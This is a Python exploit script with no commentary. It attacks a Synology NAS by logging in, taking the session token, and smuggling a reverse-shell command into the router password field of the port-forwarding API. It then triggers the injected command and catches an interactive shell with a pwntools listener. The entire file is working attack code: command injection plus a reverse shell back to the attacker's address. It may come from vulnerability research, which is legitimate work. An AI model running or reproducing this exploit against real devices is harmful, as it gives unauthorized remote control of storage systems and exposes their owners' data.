import requests
from pwn import *

requests.packages.urllib3.disable_warnings()

username = 'nasAdmin'
password = 'test'
nas_ip = '10.9.118.221'
nas_port = 5001
my_ip = '10.9.118.197'
my_port = 4444

print("[+] Accessing device..")
session = requests.session()
data = {
    'username': username,
    'passwd': password,
    'OTPcode': '',
    '__cIpHeRtExT': '',
    'client_time': '0',
    'isIframeLogin': 'yes'
}
url = f'https://{nas_ip}:{nas_port}/webman/login.cgi?enable_syno_token=yes'
response = session.post(url, data=data, verify=False)
syno_token = response.text.split("\"")[3]
headers = {'X-SYNO-TOKEN': syno_token}

print(f"[+] Extracted SYNO-TOKEN {syno_token}..")

backdoor = (
    f"b';python3 -c 'import socket,subprocess,os;"
    f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
    f"s.connect((\"{my_ip}\",{my_port}));"
    f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
    f"p=subprocess.call([\"/bin/sh\",\"-i\"])'"
)

data = {
    'router_brand': 'BT',
    'router_model': 'HomeHub2.0',
    'router_version': 'Version8.1.H.G_TypeA',
    'router_protocol': 'http',
    'router_port': '8000',
    'support_upnp': 'no',
    'support_natpmp': 'no',
    'router_account': 'aaaaa',
    'router_pass': backdoor,
    'api': 'SYNO.Core.PortForwarding.RouterConf',
    'method': 'set',
    'version': '1'
}
url = f'https://{nas_ip}:{nas_port}/webapi/_______________________________________________________entry.cgi'
session.post(url, data=data, verify=False, headers=headers)

print("[+] Backdoored external access password..")
data = {
    'rules': '[{"id":0,"enable":true,"rule_id":"1","ds_port":"1","router_port":"1","router_protocol":"tcp","serviceid":"","service_name":false,"force":false}]',
    'task_id_suffix': "PF",
    'api': 'SYNO.Core.PortForwarding.Rules',
    'method': 'save',
    'version': "1"
}
session.post(url, data=data, verify=False, headers=headers)

print("[+] Triggering backdoor..")
l = listen(my_port)
l.interactive()
